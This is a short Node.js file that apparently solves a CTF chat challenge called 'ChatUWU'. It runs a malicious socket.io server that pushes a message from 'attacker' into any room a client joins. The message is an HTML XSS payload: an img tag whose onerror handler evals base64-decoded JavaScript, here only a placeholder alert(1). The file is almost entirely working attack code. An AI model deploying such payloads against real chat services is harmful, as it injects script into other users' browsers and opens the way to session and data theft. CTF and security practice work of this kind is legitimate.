const http = require("http").Server();
const { Server } = require("socket.io");

const io = new Server(http, {
  cors: {
    origin: "http://localhost:58000",
  },
});

const hostname = "0.0.0.0";
const port = 8000;

let payload = btoa(`
// xss payload here
alert(1)
`)
payload = `
<img src='x' onerror=eval(atob("${payload}"))>
`;

io.on("connection", (socket) => {
  let { room } = socket.handshake.query;
  console.log(socket.handshake.query);

  socket.join(room);
  io.to(room).emit("msg", {
    from: "attacker",
    text: payload,
    isHtml: true,
  });
});

http.listen(port, hostname, () => {
  console.log(`ChatUWU server running at http://${hostname}:${port}/`);
});
